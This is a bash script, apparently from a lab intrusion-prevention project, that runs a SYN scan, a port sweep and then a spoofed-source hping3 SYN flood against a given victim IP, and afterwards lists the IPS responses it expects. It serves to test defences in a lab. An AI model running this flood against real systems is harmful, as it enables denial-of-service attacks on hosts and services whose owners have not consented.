#!/usr/bin/env bash
# ============================================================
#  test_attack.sh — Simulated SYN Flood Attack Script
#  Run this from the ATTACKER Kali VM
#  Requires hping3 (apt install hping3)
# ============================================================
# Usage:
#   bash test_attack.sh <VICTIM_IP> [INTERFACE]
#
# Examples:
#   bash test_attack.sh 192.168.56.101
#   bash test_attack.sh 192.168.56.101 eth0

set -euo pipefail

VICTIM_IP="${1:-}"
IFACE="${2:-eth0}"
SPORT_RANGE="1024-65535"
DURATION=30          # seconds
RATE=200             # packets per second

RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

# ── Checks ───────────────────────────────────────────────────
if [[ -z "${VICTIM_IP}" ]]; then
  echo -e "${RED}Usage: bash test_attack.sh <VICTIM_IP> [INTERFACE]${NC}"
  exit 1
fi

if ! command -v hping3 &>/dev/null; then
  echo -e "${RED}hping3 not found. Install it:  sudo apt install hping3${NC}"
  exit 1
fi

if [[ $EUID -ne 0 ]]; then
  echo -e "${YELLOW}Note: hping3 may need root. Re-running with sudo …${NC}"
  exec sudo bash "$0" "$@"
fi

# ── Banner ────────────────────────────────────────────────────
echo -e "${BOLD}"
echo "╔══════════════════════════════════════════════════╗"
echo "║          SYN Flood Simulation — hping3           ║"
echo "╚══════════════════════════════════════════════════╝"
echo -e "${NC}"
echo -e "  Target     : ${RED}${BOLD}${VICTIM_IP}${NC}"
echo -e "  Interface  : ${IFACE}"
echo -e "  Rate       : ${RATE} pkts/s"
echo -e "  Duration   : ${DURATION}s"
echo ""
echo -e "${YELLOW}Phase 1/3 — Light reconnaissance scan (10s)${NC}"
echo -e "  Sending SYN packets to common ports (22, 80, 443, 8080) …"
hping3 -S --faster -p 80 -c 20 "${VICTIM_IP}" -I "${IFACE}" 2>/dev/null || true
sleep 2

echo ""
echo -e "${YELLOW}Phase 2/3 — Port scan sweep${NC}"
for PORT in 22 80 443 3306 5432 8080 8443; do
  echo -e "  → SYN to port ${PORT}"
  hping3 -S -p "${PORT}" -c 5 --interval u200 "${VICTIM_IP}" -I "${IFACE}" 2>/dev/null || true
done
sleep 2

echo ""
echo -e "${RED}${BOLD}Phase 3/3 — SYN FLOOD (${RATE} pps for ${DURATION}s)${NC}"
echo -e "  ${RED}Attack running … watch the IPS dashboard!${NC}"
echo -e "  Press Ctrl-C to stop early."
echo ""

hping3 --syn \
       --flood \
       --rand-source \
       -p 80 \
       -i u$(( 1000000 / RATE )) \
       --interface "${IFACE}" \
       "${VICTIM_IP}" &
HPING_PID=$!

# Progress bar
for i in $(seq 1 "${DURATION}"); do
  printf "\r  [%-30s] %ds/%ds" "$(printf '#%.0s' $(seq 1 $((i*30/DURATION))))" "$i" "${DURATION}"
  sleep 1
done

kill "${HPING_PID}" 2>/dev/null || true
echo ""
echo ""
echo -e "${GREEN}${BOLD}Attack simulation complete.${NC}"
echo ""
echo -e "${CYAN}Expected IPS response:${NC}"
echo -e "  1. SYN flood detected within ${BOLD}5s${NC} analysis window"
echo -e "  2. Attacker IP blocked via ${BOLD}iptables DROP${NC} rule"
echo -e "  3. Event logged in dashboard under ${BOLD}Live Events${NC}"
echo -e "  4. Auto-unblock scheduled in ${BOLD}300s${NC} (self-healing)"
echo ""
echo -e "${CYAN}Verify on IPS (victim) machine:${NC}"
echo -e "  sudo iptables -L INPUT -n --line-numbers"
echo -e "  sudo cat ips.log | grep BLOCK"
